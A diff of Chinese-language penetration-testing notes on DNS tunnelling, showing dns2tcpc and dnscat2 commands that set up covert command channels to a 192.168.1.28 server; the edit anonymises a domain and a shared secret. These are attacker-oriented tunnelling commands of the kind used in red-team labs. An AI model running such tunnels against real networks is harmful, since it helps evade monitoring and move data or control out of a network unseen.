@@ -101,7 +101,8 @@ dns2tcpc -r ssh -z dns28.xxx.com 192.168.1.28 -l 8888 -d 2<br>
 https://www.freebuf.com/articles/network/208242.html<br>
 https://www.cnblogs.com/bonelee/p/7927706.html<br>
 *******************************************************************<br>
-7、a 安装<br>
+7、DNS隧道工具 dnscat2<br>
+a 安装<br>
 服务端 <br>
 debian9安装ruby环境: apt-get install ruby-full <br>
 git clone https://github.com/iagox86/dnscat2.git <br>
@@ -118,10 +119,10 @@ b 使用 <br>
 在服务端机器上，执行： <br>
 root@kali:/opt/dnscat2/server# <br>
 ruby dnscat2.rb //可以不带任何参数执行 <br>
-ruby dnscat2.rb –dns “domain=dns.hxsec.com,host=192.168.1.28,port=5353” –no-cache <br>
+ruby dnscat2.rb –dns “domain=dns.xxx.com,host=192.168.1.28,port=5353” –no-cache <br>
 在客户端机器上，执行： <br>
 [root@centos7vm client]# <br>
-./dnscat –dns server=192.168.1.28,port=5353 –secret=7296f13b2295b56a9e451ac3c418c96f<br><br>
+./dnscat –dns server=192.168.1.28,port=5353 –secret=xxx  //服务端会回显密钥<br><br>
 
 c 进一步操作 <br>
 可以用”sessions”命令来查看已经创建的会话 <br>
